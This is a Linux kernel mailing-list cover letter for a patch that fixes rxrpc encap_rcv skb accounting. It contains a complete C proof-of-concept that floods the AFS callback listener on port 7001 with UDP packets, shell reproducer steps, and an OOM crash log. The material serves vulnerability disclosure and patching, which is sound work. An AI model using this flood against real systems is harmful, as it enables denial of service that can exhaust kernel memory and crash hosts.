Received: from mail-pg1-f169.google.com (mail-pg1-f169.google.com [209.85.215.169])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B44D23CBE91
	for <stable@vger.kernel.org>; Sat,  5 Sep 2026 08:17:53 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.169
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788596281; cv=none; b=uvGxFir1jq0/GCKqrobCEGecBhWbgCTPsAbsnyIlE7zMNHKmaA5R6SDTkc49h2HCRDDN3iZ6IoDEl8si6xZhRT2yG4uGLntBxlK/hS3pEqHgnPgo1wwJmUKl0MaTayUO9itMFCCTni2NVNfsO6EwDTkgpbPj0QyFlxAnBEWH3/4=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788596281; c=relaxed/simple;
	bh=YVbBoDE3LoqXJqjRHOVhmIH0iclqQE5ULOdlSag8wg0=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=tJXMxqCQQZb/u/mZOPdejdkrod1x920PZaBogiJB3R8I1pP9Ljl+JrKgUX5pfH+syEixcilAVXkxmWjbd+dKNwnURWtSzuBeoxB+dH4omNjI0RXY5MFf1lA0h88MzMlMbfpr7w+MawTXaZiE+KDtr1zhZpUtEg/nCmkPpiOwo8Q=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=LnGah3c+; arc=none smtp.client-ip=209.85.215.169
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="LnGah3c+"
Received: by mail-pg1-f169.google.com with SMTP id 41be03b00d2f7-cc1cbb64a1fso1831104a12.1
        for <stable@vger.kernel.org>; Sat, 05 Sep 2026 01:17:53 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1788596271; x=1789201071; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=p7l2rQdbN5sTBDILhc502lX+wUUitEY5wQFGXbuyxpQ=;
        b=LnGah3c+7be60syHRPGrqcNurfhEA0BKKlv0xv3nvraapsFa2YdHrOF5a4EhixahzN
         ZDL3viJumRYZPFxTJwGURKeTPfFyj2dmwiU++F29F+aPI6qm14ay3Ds+OZonZNYu4qQs
         GXf2MUQYNLUpeJ4aRoSKE5rkf/JXzke0Vjum/tGQyRCQ5XIqmFQ5hPtGDVe1+yKOyIxZ
         /5Q+7STmViDTzSxpKc15uV0S9zGsDSdJ7PTfzZTD6AMtpNu/CNwq9/MsiVB2Ntq6ndp4
         /90FQiQ48+yvdXlmD1Ufhbt/Xj5ddc2O22D9SBOT1GV1BMB4Br/DGJQmpRarfzkNcbMP
         mA1Q==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788596271; x=1789201071;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=p7l2rQdbN5sTBDILhc502lX+wUUitEY5wQFGXbuyxpQ=;
        b=fIQclBFdXYL1C8WAIfeEJrOMk7J2F1E6jUL2vNOrSX0A0nTVRgDd1ZUsYtpqZokgHK
         xyeWQ6YDAUNRY3qX81cY+d+xgSJlR24kZ+5fhqdZAPx2cLqocn/2BW0B8HBnkpQ/XnEz
         PR9eilOOkv3GM5DCTmbn+954TwYPAlN4ieGWMuSWEavccvikZ2RomiFGzvSYqZ5cloUL
         15EXoCp6AfjgmIkyQ/GsAM/G0tJYNNVmwxAolMMm3IbL7iU1IwoQmh9MPfpJhjdqk8eL
         PUKBOpnq75q19HmZMk33MIwcPoVLwSb1nbLZiFR4VFGhtr/MM9go6kqHLZI28x//gn04
         veZA==
X-Forwarded-Encrypted: i=1; AKwUvBzGkdWet81E0Veae57X/OeYXN+mxYNzJLxM83OJD0d/W5ztvXBRPMOiHo4Ns/HJBK3SEg5PeTM=@vger.kernel.org
X-Gm-Message-State: AFuF++mX243oJajaCbhU4EL8/iw4cJzflHSS1/W+LFFJASgxe75ZwZzy
	BlVSVMPGf1nLZ4XxNNZJL44pzS9ytJM20Zs86In8ubY/85s0expZe250/6AJatI6fYLkb1ZTI5/
	j/O6Yo31G
X-Gm-Gg: AYBFou2NaehdZUuUaKIHIeGX7iCf2Ges0Jo9vSsavyGyhBQqjHmv/222GgLu8lHJ/dz
	YvOFgSXLEJ9Rei/Heik036Va2quCyejmdAbKKj6Zq3UOddNrmSVf0mlZ/x73qQH4dZynpCcOQ33
	V3ILCBwDCXQGStmSUElVnhdPW6WhVrHm8pjtBMMu3czStdmj4iOPyTL3qjfYaLD0RYxN65aUD/F
	dfuxVUdvY3DtiaMSgYB7HRW1gMMbZiX7i3eLK6gTZSR6cH7TwGVzm8vxN0o5Dc4NYZWEKIzBVmt
	y351icpkIuShztnKezoidGqbGAJa0KGFamwoZFTS017LGarAyy4sYMk2c0i8trLcr+mFF60XKfM
	emQuCHlx/vUGg/CryKOLnBKOUdurTSX2P7wheGFJ99Aih7vwaaZB2PG9u8PvZndfCkjtrJEUUN2
	4Y9dzlcO8F5+6vEUW2+PHyvzpIQnc1OVqLy7AcVyEGhBydl8d/mSC5jtT73z/qPQGtO3fN6e8Wn
	Fe9qcUuJxfQoH/q0i1j2UzBAD8A1fQ=
X-Received: by 2002:a05:6a20:a11e:b0:3d3:ae40:51df with SMTP id adf61e73a8af0-3da3a03d016mr15249733637.19.1788596270744;
        Sat, 05 Sep 2026 01:17:50 -0700 (PDT)
Received: from b6ad5085b32f.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cc455451b46sm1713049a12.18.2026.09.05.01.17.45
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 05 Sep 2026 01:17:50 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: David Howells <dhowells@redhat.com>,
	Marc Dionne <marc.dionne@auristor.com>,
	"David S . Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>,
	linux-afs@lists.infradead.org,
	linux-kernel@vger.kernel.org,
	stable@vger.kernel.org,
	Zihan Xi <zihanx@nebusec.ai>
Subject: [PATCH net v3 0/1] rxrpc: fix encap_rcv skb accounting exhaustion
Date: Sat,  5 Sep 2026 08:17:39 +0000
Message-ID: <cover.1788539302.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/rxrpc/io_thread.c and
net/rxrpc/local_object.c. A non-root user can flood the in-kernel
AFS callback listener on [::]:7001; the recorded panic also used
privileged CPU pinning and a SCHED_FIFO hog against krxrpcio.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

rxrpc_encap_rcv() takes encapsulated UDP packets off the UDP receive
path and queues them on the RxRPC local queue without preserving UDP
receive-buffer accounting. A local AF_RXRPC service such as the AFS
callback listener can therefore be flooded with RxRPC-shaped UDP
packets that are no longer limited by the UDP socket rcvbuf.

The recorded panic is not an allocation at the encap_rcv enqueue
site. After privileged CPU pinning and a SCHED_FIFO hog against
krxrpcio/7001, that I/O thread OOMed while sending a reject:
rxrpc_reject_packet() -> sock_alloc_send_pskb() -> __alloc_skb() /
kmalloc_reserve(). Unreclaimable slab at panic was dominated by
skbuff_small_head (~576MB) and skbuff_head_cache (~221MB);
rxrpc_call_jar was only about 1938KB, so incoming-call setup was not
the main memory impact.

The reproducer also writes krxrpcio into a frozen cgroup. That does
not stop this kernel I/O thread: the crash Comm is still
krxrpcio/7001 in the allocator. The steps that actually slowed it
were pinning the thread to CPU1 and running a SCHED_FIFO hog on
that CPU.

The selected Fixes: commit is 446b3e14525b because that is the
boundary where encap_rcv() started queueing the skb for later
I/O-thread consumption instead of consuming it immediately on the UDP
receive path. That is the root-cause fact repaired here.

The patch reaccounts each encapsulated skb against the UDP socket
before queueing it and drops packets once sk_rcvbuf is exhausted.
The I/O thread orphans each skb when it dequeues it from the local
queue so UDP rmem ownership does not follow packets onto call or
connection queues. skb_set_owner_r() does not take sk_refcnt, so
rxrpc_destroy_local() still clears sk_user_data under RCU protection
and delays sock_release() until the local queues are purged. That
covers skbs still sitting on local->rx_queue.

For this network-triggered bug we also considered packetdrill, but
the reproducer needs a sustained local flood of unique incoming RxRPC
calls rather than a short packetdrill script, so the dedicated sender
below was the direct way to validate the failure and the fix.

The crash log below is decoded against the unfixed vmlinux from the
same 7.3.0-rc1+ net/main guest that panicked. Comm: krxrpcio/7001
is the in-kernel I/O thread that invoked the OOM killer from
rxrpc_reject_packet(), not from encap_rcv() itself. The UDP flood
was sent by the non-root poc_rxrpc_mem process; the recorded panic
also used privileged CPU pinning and a SCHED_FIFO hog. Putting the
I/O thread in cgroup.freeze did not freeze that kthread.

Reproducer:

    gcc -O2 -static -pthread -o poc_rxrpc_mem poc.c
    sysctl -w kernel.panic_on_warn=0
    sysctl -w vm.panic_on_oom=1
    taskset -p 2 $(pgrep krxrpcio)
    mkdir -p /sys/fs/cgroup/slowio
    echo 1 > /sys/fs/cgroup/slowio/cgroup.freeze
    echo $(pgrep krxrpcio) > /sys/fs/cgroup/slowio/cgroup.procs
    taskset -c 1 chrt -f 99 /bin/bash -c 'while :; do :; done' &
    taskset -c 0 ./poc_rxrpc_mem -t 16 -s 120 -l 8

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define RXRPC_PACKET_TYPE_DATA 1
#define RXRPC_CLIENT_INITIATED 0x01
#define RXRPC_SERVICE_ID 1
#define AFS_CB_CALLBACK_OP 204
#define DEFAULT_PORT 7001
#define DEFAULT_THREADS 4
#define DEFAULT_SECONDS 20
#define DEFAULT_PAYLOAD 8

struct __attribute__((packed)) rxrpc_wire_header {
	uint32_t epoch;
	uint32_t cid;
	uint32_t callNumber;
	uint32_t seq;
	uint32_t serial;
	uint8_t type;
	uint8_t flags;
	uint8_t userStatus;
	uint8_t securityIndex;
	uint16_t reserved;
	uint16_t serviceId;
};

struct thread_args {
	struct sockaddr_in6 dst;
	int seconds;
	size_t payload_len;
	uint32_t cid_seed;
	unsigned long sent;
};

static volatile sig_atomic_t stop_flag;

static void on_alarm(int sig)
{
	(void)sig;
	stop_flag = 1;
}

static void *sender_thread(void *arg)
{
	struct thread_args *ta = arg;
	int fd;
	char *packet;
	struct rxrpc_wire_header *hdr;
	uint32_t *op;
	uint32_t *count;
	uint32_t seq = 1;
	uint32_t cid = ta->cid_seed;

	fd = socket(AF_INET6, SOCK_DGRAM, 0);
	if (fd < 0) {
		perror("socket");
		return NULL;
	}

	packet = malloc(sizeof(*hdr) + ta->payload_len);
	if (!packet) {
		perror("malloc");
		close(fd);
		return NULL;
	}
	memset(packet + sizeof(*hdr), 0, ta->payload_len);
	hdr = (struct rxrpc_wire_header *)packet;
	hdr->callNumber = htonl(1);
	hdr->type = RXRPC_PACKET_TYPE_DATA;
	hdr->flags = RXRPC_CLIENT_INITIATED;
	hdr->userStatus = 0;
	hdr->securityIndex = 0;
	hdr->reserved = 0;
	hdr->serviceId = htons(RXRPC_SERVICE_ID);
	op = (uint32_t *)(packet + sizeof(*hdr));
	*op = htonl(AFS_CB_CALLBACK_OP);
	if (ta->payload_len >= 8) {
		count = op + 1;
		*count = htonl(1);
	}

	/*
	 * Each datagram is a new incoming RxRPC call (seq=1, unique cid).
	 * That makes the I/O thread do full incoming-call setup, so it
	 * falls behind encap_rcv and local->rx_queue can grow.
	 */
	while (!stop_flag) {
		hdr->epoch = htonl(0x80000000u | cid);
		hdr->cid = htonl(cid << 2);
		hdr->seq = htonl(1);
		hdr->serial = htonl(seq);
		if (sendto(fd, packet, sizeof(*hdr) + ta->payload_len, 0,
			   (struct sockaddr *)&ta->dst, sizeof(ta->dst)) >= 0) {
			ta->sent++;
			seq++;
			cid += 32;
		}
	}

	free(packet);
	close(fd);
	return NULL;
}

static void usage(const char *prog)
{
	fprintf(stderr, "Usage: %s [-a addr] [-p port] [-t threads] [-s seconds] [-l payload_len]\n", prog);
}

int main(int argc, char **argv)
{
	struct sockaddr_in6 dst = {
		.sin6_family = AF_INET6,
		.sin6_port = htons(DEFAULT_PORT),
	};
	const char *addr = "::1";
	int threads = DEFAULT_THREADS;
	int seconds = DEFAULT_SECONDS;
	size_t payload_len = DEFAULT_PAYLOAD;
	pthread_t *tids;
	struct thread_args *args;
	unsigned long total = 0;
	int opt;

	while ((opt = getopt(argc, argv, "a:p:t:s:l:h")) != -1) {
		switch (opt) {
		case 'a':
			addr = optarg;
			break;
		case 'p':
			dst.sin6_port = htons((uint16_t)strtoul(optarg, NULL, 0));
			break;
		case 't':
			threads = atoi(optarg);
			break;
		case 's':
			seconds = atoi(optarg);
			break;
		case 'l':
			payload_len = strtoul(optarg, NULL, 0);
			break;
		default:
			usage(argv[0]);
			return 1;
		}
	}

	if (threads <= 0 || seconds <= 0 || payload_len < 4 || payload_len > 65000) {
		usage(argv[0]);
		return 1;
	}
	if (inet_pton(AF_INET6, addr, &dst.sin6_addr) != 1) {
		perror("inet_pton");
		return 1;
	}

	signal(SIGALRM, on_alarm);
	alarm(seconds);

	tids = calloc((size_t)threads, sizeof(*tids));
	args = calloc((size_t)threads, sizeof(*args));
	if (!tids || !args) {
		perror("calloc");
		return 1;
	}

	pthread_attr_t attr;
	if (pthread_attr_init(&attr) != 0) {
		perror("pthread_attr_init");
		return 1;
	}
	if (pthread_attr_setstacksize(&attr, 64 * 1024) != 0) {
		perror("pthread_attr_setstacksize");
		return 1;
	}

	for (int i = 0; i < threads; i++) {
		args[i].dst = dst;
		args[i].seconds = seconds;
		args[i].payload_len = payload_len;
		args[i].cid_seed = 1 + (uint32_t)i;
		if (pthread_create(&tids[i], &attr, sender_thread, &args[i]) != 0) {
			fprintf(stderr, "pthread_create(%d) failed: %s\n", i, strerror(errno));
			stop_flag = 1;
			threads = i;
			break;
		}
	}
	pthread_attr_destroy(&attr);

	for (int i = 0; i < threads; i++) {
		pthread_join(tids[i], NULL);
		total += args[i].sent;
	}

	printf("sent_packets=%lu payload_len=%zu threads=%d duration=%d\n",
	       total, payload_len, threads, seconds);
	free(args);
	free(tids);
	return 0;
}
------END poc.c--------

----BEGIN crash log----
[   56.818010][ T4951] krxrpcio/7001 invoked oom-killer: gfp_mask=0xc2cc0(GFP_KERNEL|__GFP_NOWARN|__GFP_COMP|__GFP_NOMEMALLOC), order=0, oom_score_adj=0
[   56.818158][ T4951] CPU: 1 UID: 0 PID: 4951 Comm: krxrpcio/7001 Not tainted 7.3.0-rc1+ #3 PREEMPT(full)
[   56.818172][ T4951] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   56.818187][ T4951] Call Trace:
[   56.818190][ T4951]  <TASK>
[   56.818195][ T4951]  dump_stack_lvl+0x16c/0x200 (dump_stack_lvl at lib/dump_stack.c:123:3)
[   56.818259][ T4951]  dump_stack+0x15/0x20 (dump_stack at lib/dump_stack.c:130:1)
[   56.818267][ T4951]  dump_header+0xfe/0x990 (is_memcg_oom at mm/oom_kill.c:74:11 |  (inlined by) dump_header at mm/oom_kill.c:465:6)
[   56.818279][ T4951]  out_of_memory+0x8f3/0x17a0 (check_panic_on_oom at mm/oom_kill.c:1077:23 |  (inlined by) out_of_memory at mm/oom_kill.c:1143:2)
[   56.818290][ T4951]  ? __pfx_out_of_memory+0x10/0x10 (out_of_memory at mm/oom_kill.c:1104:1)
[   56.818303][ T4951]  __alloc_frozen_pages_noprof+0x2b34/0x3610 (__alloc_pages_may_oom at mm/page_alloc.c:4113:5 |  (inlined by) __alloc_pages_slowpath at mm/page_alloc.c:5030:9 |  (inlined by) __alloc_frozen_pages_noprof at mm/page_alloc.c:5449:9)
[   56.818316][ T4951]  ? __pfx_stack_trace_consume_entry+0x10/0x10 (stack_trace_consume_entry at kernel/stacktrace.c:86:7)
[   56.818338][ T4951]  ? __pfx___alloc_frozen_pages_noprof+0x10/0x10 (__alloc_frozen_pages_noprof at mm/page_alloc.c:5385:1)
[   56.818349][ T4951]  ? stack_trace_save+0x8d/0xc0 (stack_trace_save at kernel/stacktrace.c:123:10)
[   56.818358][ T4951]  ? __pfx_stack_trace_save+0x10/0x10 (stack_trace_save at kernel/stacktrace.c:114:1)
[   56.818368][ T4951]  ? stack_depot_save_flags+0x28/0x9c0 (stack_depot_save_flags at lib/stackdepot.c:667:15)
[   56.818393][ T4951]  ? __sanitizer_cov_trace_cmp4+0x16/0x20 (__sanitizer_cov_trace_cmp4 at kernel/kcov.c:285:1)
[   56.818404][ T4951]  ? find_match+0xc9/0x1590 (find_match at net/ipv6/route.c:775:1)
[   56.818414][ T4951]  ? kasan_save_stack+0x39/0x60 (kasan_save_stack at mm/kasan/common.c:58:9)
[   56.818425][ T4951]  ? kasan_save_track+0x14/0x40 (kasan_set_track at mm/kasan/common.c:70:22 |  (inlined by) kasan_save_track at mm/kasan/common.c:79:2)
[   56.818437][ T4951]  ? kasan_save_stack+0x49/0x60 (kasan_save_stack at mm/kasan/common.c:59:1)
[   56.818448][ T4951]  ? kasan_save_stack+0x39/0x60 (kasan_save_stack at mm/kasan/common.c:58:9)
[   56.818460][ T4951]  ? alloc_skb_with_frags+0xde/0x730 (alloc_skb at include/linux/skbuff.h:1384:9 |  (inlined by) alloc_skb_with_frags at net/core/skbuff.c:6789:8)
[   56.818471][ T4951]  ? sock_alloc_send_pskb+0x89f/0xa50 (sock_alloc_send_pskb at net/core/sock.c:3015:8)
[   56.818483][ T4951]  ? __ip6_append_data+0x2b35/0x48c0 (sock_alloc_send_skb at include/net/sock.h:1907:9 |  (inlined by) __ip6_append_data at net/ipv6/ip6_output.c:1693:11)
[   56.818493][ T4951]  ? ip6_make_skb+0x29f/0x3b0 (ip6_make_skb at net/ipv6/ip6_output.c:2096:5)
[   56.818503][ T4951]  ? udpv6_sendmsg+0x233f/0x2d60 (udpv6_sendmsg at net/ipv6/udp.c:1720:9)
[   56.818522][ T4951]  allocate_slab+0x1ce/0x640 (alloc_slab_page at mm/slub.c:3347:10 |  (inlined by) allocate_slab at mm/slub.c:3470:10)
[   56.818533][ T4951]  new_slab+0x33/0x60 (new_slab at mm/slub.c:3514:1)
[   56.818541][ T4951]  refill_objects+0xe3/0x3e0 (refill_objects at mm/slub.c:7410:9)
[   56.818549][ T4951]  ? __pcs_replace_empty_main+0x144/0x670 (local_lock_release at include/linux/local_lock_internal.h:62:2 |  (inlined by) __pcs_replace_empty_main at mm/slub.c:4762:2)
[   56.818567][ T4951]  __pcs_replace_empty_main+0x2f9/0x670 (refill_sheaf at mm/slub.c:2888:14 |  (inlined by) __pcs_replace_empty_main at mm/slub.c:4774:6)
[   56.818583][ T4951]  kmem_cache_alloc_node_noprof+0x5b0/0x7a0 (alloc_from_pcs at mm/slub.c:4850:9 |  (inlined by) slab_alloc_node at mm/slub.c:4984:11 |  (inlined by) kmem_cache_alloc_node_noprof at mm/slub.c:5068:8)
[   56.818595][ T4951]  ? kmalloc_reserve+0x14e/0x360 (kmalloc_reserve at net/core/skbuff.c:618:9)
[   56.818616][ T4951]  kmalloc_reserve+0x14e/0x360 (kmalloc_reserve at net/core/skbuff.c:618:9)
[   56.818636][ T4951]  __alloc_skb+0x193/0x750 (__alloc_skb at net/core/skbuff.c:715:9)
[   56.818648][ T4951]  ? __alloc_skb+0x5d6/0x750 (local_bh_disable at include/linux/bottom_half.h:20:2 |  (inlined by) __alloc_skb at net/core/skbuff.c:697:3)
[   56.818660][ T4951]  ? __pfx___alloc_skb+0x10/0x10 (__alloc_skb at net/core/skbuff.c:676:1)
[   56.818677][ T4951]  alloc_skb_with_frags+0xde/0x730 (alloc_skb at include/linux/skbuff.h:1384:9 |  (inlined by) alloc_skb_with_frags at net/core/skbuff.c:6789:8)
[   56.818686][ T4951]  ? __local_bh_enable_ip+0xaa/0x130 (native_irq_enable at arch/x86/include/asm/irqflags.h:42:2 |  (inlined by) arch_local_irq_enable at arch/x86/include/asm/irqflags.h:119:2 |  (inlined by) __local_bh_enable_ip at kernel/softirq.c:478:2)
[   56.818697][ T4951]  ? __sanitizer_cov_trace_switch+0x54/0xa0 (__sanitizer_cov_trace_switch at kernel/kcov.c:346:16)
[   56.818709][ T4951]  sock_alloc_send_pskb+0x89f/0xa50 (sock_alloc_send_pskb at net/core/sock.c:3015:8)
[   56.818721][ T4951]  ? find_held_lock+0x31/0x90 (find_held_lock at kernel/locking/lockdep.c:5367:5)
[   56.818735][ T4951]  ? __this_cpu_preempt_check+0x13/0x20 (__this_cpu_preempt_check at lib/smp_processor_id.c:65:1)
[   56.818746][ T4951]  ? __pfx_sock_alloc_send_pskb+0x10/0x10 (sock_alloc_send_pskb at net/core/sock.c:2988:1)
[   56.818758][ T4951]  ? __lock_acquire+0x457/0x2bb0 (mark_usage at kernel/locking/lockdep.c:4690:5 |  (inlined by) __lock_acquire at kernel/locking/lockdep.c:5208:7)
[   56.818767][ T4951]  ? ipv6_dev_get_saddr+0x365/0xd40 (ipv6_dev_get_saddr at net/ipv6/addrconf.c:1825:1)
[   56.818782][ T4951]  ? __lock_acquire+0x457/0x2bb0 (mark_usage at kernel/locking/lockdep.c:4690:5 |  (inlined by) __lock_acquire at kernel/locking/lockdep.c:5208:7)
[   56.818793][ T4951]  __ip6_append_data+0x2b35/0x48c0 (sock_alloc_send_skb at include/net/sock.h:1907:9 |  (inlined by) __ip6_append_data at net/ipv6/ip6_output.c:1693:11)
[   56.818808][ T4951]  ? __pfx_ip_generic_getfrag+0x10/0x10 (ip_generic_getfrag at net/ipv4/ip_output.c:937:1)
[   56.818826][ T4951]  ? __pfx___ip6_append_data+0x10/0x10 (__ip6_append_data at net/ipv6/ip6_output.c:1459:1)
[   56.818836][ T4951]  ? __sanitizer_cov_trace_const_cmp4+0x16/0x20 (__sanitizer_cov_trace_const_cmp4 at kernel/kcov.c:312:1)
[   56.818846][ T4951]  ? ip6_setup_cork+0x5d7/0x14b0 (ip6_setup_cork at net/ipv6/ip6_output.c:1449:1)
[   56.818858][ T4951]  ip6_make_skb+0x29f/0x3b0 (ip6_make_skb at net/ipv6/ip6_output.c:2096:5)
[   56.818869][ T4951]  ? __pfx_ip_generic_getfrag+0x10/0x10 (ip_generic_getfrag at net/ipv4/ip_output.c:937:1)
[   56.818884][ T4951]  ? __pfx_ip6_make_skb+0x10/0x10 (ip6_make_skb at net/ipv6/ip6_output.c:2070:1)
[   56.818898][ T4951]  ? __this_cpu_preempt_check+0x13/0x20 (__this_cpu_preempt_check at lib/smp_processor_id.c:65:1)
[   56.818910][ T4951]  udpv6_sendmsg+0x233f/0x2d60 (udpv6_sendmsg at net/ipv6/udp.c:1720:9)
[   56.818922][ T4951]  ? udpv6_sendmsg+0x233f/0x2d60 (udpv6_sendmsg at net/ipv6/udp.c:1720:9)
[   56.818940][ T4951]  ? __pfx_udpv6_sendmsg+0x10/0x10 (udpv6_sendmsg at net/ipv6/udp.c:1473:1)
[   56.818953][ T4951]  ? ret_from_fork_asm+0x1a/0x30 (ret_from_fork_asm at arch/x86/entry/entry_64.S:255:0)
[   56.818967][ T4951]  ? stack_trace_save+0x8d/0xc0 (stack_trace_save at kernel/stacktrace.c:123:10)
[   56.818978][ T4951]  ? __lock_acquire+0x457/0x2bb0 (mark_usage at kernel/locking/lockdep.c:4690:5 |  (inlined by) __lock_acquire at kernel/locking/lockdep.c:5208:7)
[   56.818989][ T4951]  ? kasan_save_stack+0x49/0x60 (kasan_save_stack at mm/kasan/common.c:59:1)
[   56.818999][ T4951]  ? kasan_save_stack+0x39/0x60 (kasan_save_stack at mm/kasan/common.c:58:9)
[   56.819016][ T4951]  ? debug_smp_processor_id+0x17/0x20 (debug_smp_processor_id at lib/smp_processor_id.c:59:1)
[   56.819024][ T4951]  ? rcu_is_watching+0x14/0xd0 (rcu_is_watching_curr_cpu at include/linux/context_tracking.h:128:25 |  (inlined by) rcu_is_watching at kernel/rcu/tree.c:753:8)
[   56.819036][ T4951]  ? __sanitizer_cov_trace_const_cmp1+0x1a/0x20 (__sanitizer_cov_trace_const_cmp1 at kernel/kcov.c:298:1)
[   56.819046][ T4951]  ? __sanitizer_cov_trace_switch+0x54/0xa0 (__sanitizer_cov_trace_switch at kernel/kcov.c:346:16)
[   56.819059][ T4951]  rxrpc_reject_packet+0x5d1/0x7e0 (do_udp_sendmsg at net/rxrpc/output.c:30:11 |  (inlined by) rxrpc_reject_packet at net/rxrpc/output.c:863:9)
[   56.819072][ T4951]  ? rxrpc_reject_packet+0x5d1/0x7e0 (do_udp_sendmsg at net/rxrpc/output.c:30:11 |  (inlined by) rxrpc_reject_packet at net/rxrpc/output.c:863:9)
[   56.819086][ T4951]  ? __pfx_rxrpc_reject_packet+0x10/0x10 (rxrpc_reject_packet at net/rxrpc/output.c:807:1)
[   56.819101][ T4951]  ? __kasan_check_write+0x14/0x20 (__kasan_check_write at mm/kasan/shadow.c:38:1)
[   56.819114][ T4951]  ? __this_cpu_preempt_check+0x13/0x20 (__this_cpu_preempt_check at lib/smp_processor_id.c:65:1)
[   56.819123][ T4951]  ? lockdep_hardirqs_on+0x7e/0x100 (lockdep_hardirqs_on at kernel/locking/lockdep.c:4488:2)
[   56.819137][ T4951]  ? debug_smp_processor_id+0x17/0x20 (debug_smp_processor_id at lib/smp_processor_id.c:59:1)
[   56.819149][ T4951]  ? rxrpc_put_peer+0xbd/0x4e0 (rxrpc_put_peer at net/rxrpc/peer_object.c:447:1)
[   56.819164][ T4951]  rxrpc_io_thread+0x1294/0x3ca0 (rxrpc_io_thread at net/rxrpc/io_thread.c:479:39)
[   56.819181][ T4951]  ? __pfx_rxrpc_io_thread+0x10/0x10 (rxrpc_io_thread at net/rxrpc/io_thread.c:431:1)
[   56.819191][ T4951]  ? kthread_affine_node+0x23d/0x310 (kthread_affine_node at kernel/kthread.c:377:2)
[   56.819212][ T4951]  ? __lock_acquire+0x457/0x2bb0 (mark_usage at kernel/locking/lockdep.c:4690:5 |  (inlined by) __lock_acquire at kernel/locking/lockdep.c:5208:7)
[   56.819242][ T4951]  ? debug_smp_processor_id+0x17/0x20 (debug_smp_processor_id at lib/smp_processor_id.c:59:1)
[   56.819255][ T4951]  ? __sanitizer_cov_trace_const_cmp1+0x1a/0x20 (__sanitizer_cov_trace_const_cmp1 at kernel/kcov.c:298:1)
[   56.819265][ T4951]  ? __kthread_parkme+0x18e/0x230 (__kthread_parkme at kernel/kthread.c:285:2)
[   56.819278][ T4951]  ? __pfx_rxrpc_io_thread+0x10/0x10 (rxrpc_io_thread at net/rxrpc/io_thread.c:431:1)
[   56.819289][ T4951]  kthread+0x3e6/0x520 (kthread at drivers/block/aoe/aoecmd.c:1243:20)
[   56.819300][ T4951]  ? kthread+0x3e6/0x520 (kthread at drivers/block/aoe/aoecmd.c:1243:20)
[   56.819312][ T4951]  ? __pfx_kthread+0x10/0x10 (kthread at drivers/block/aoe/aoecmd.c:1230:1)
[   56.819325][ T4951]  ret_from_fork+0x767/0xdd0 (ret_from_fork at arch/x86/kernel/process.c:164:12)
[   56.819335][ T4951]  ? __pfx_ret_from_fork+0x10/0x10 (ret_from_fork at arch/x86/kernel/process.c:153:1)
[   56.819345][ T4951]  ? __sanitizer_cov_trace_const_cmp8+0x18/0x20 (__sanitizer_cov_trace_const_cmp8 at kernel/kcov.c:319:1)
[   56.819355][ T4951]  ? __switch_to+0x7f1/0x1150 (__switch_to at arch/x86/kernel/process_64.c:714:1)
[   56.819367][ T4951]  ? __pfx_kthread+0x10/0x10 (kthread at drivers/block/aoe/aoecmd.c:1230:1)
[   56.819381][ T4951]  ret_from_fork_asm+0x1a/0x30 (ret_from_fork_asm at arch/x86/entry/entry_64.S:255:0)
[   56.819397][ T4951]  </TASK>
[   56.821094][ T4951] Mem-Info:
[   56.821101][ T4951] active_anon:9698 inactive_anon:2686 isolated_anon:0
[   56.821101][ T4951]  active_file:65 inactive_file:87 isolated_file:0
[   56.821101][ T4951]  unevictable:1768 dirty:0 writeback:0
[   56.821101][ T4951]  slab_reclaimable:5409 slab_unreclaimable:243016
